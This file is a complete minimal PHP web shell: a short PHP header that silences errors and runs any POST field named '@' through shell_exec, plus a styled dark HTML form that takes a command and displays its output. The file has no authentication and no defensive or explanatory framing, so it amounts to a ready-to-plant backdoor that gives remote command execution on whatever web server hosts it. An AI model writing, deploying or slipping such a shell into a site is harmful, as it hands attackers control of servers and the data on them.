<?php error_reporting(0);
$o = ($c = @$_POST['@']) ? shell_exec($c) : ''
?>
<html>
<body>
<style>
  * {
    background: #111;
    box-sizing: border-box;
    font-size: 12px;
    color: #ccc;
    font-family: monospace
  }

  *:focus {
    outline: 0
  }

  pre, input {
    border: 1px solid #545
  }

  pre {
    padding: 5px;
    margin: 5px 0 0
  }

  input {
    width: 100%;
    padding: 5px;
    margin: 0
  }
</style>
<form method="post">
  <input autofocus name="@" value="<?= htmlspecialchars($c, ENT_QUOTES, 'utf-8') ?>" required>
</form>
<?php if ($o): ?>
  <pre contenteditable><?= htmlspecialchars($o, ENT_QUOTES, 'utf-8') ?></pre>
<?php elseif ($_SERVER['REQUEST_METHOD'] == 'POST'): ?>
  <pre>empty</pre>
<?php endif ?>
</body>
</html>
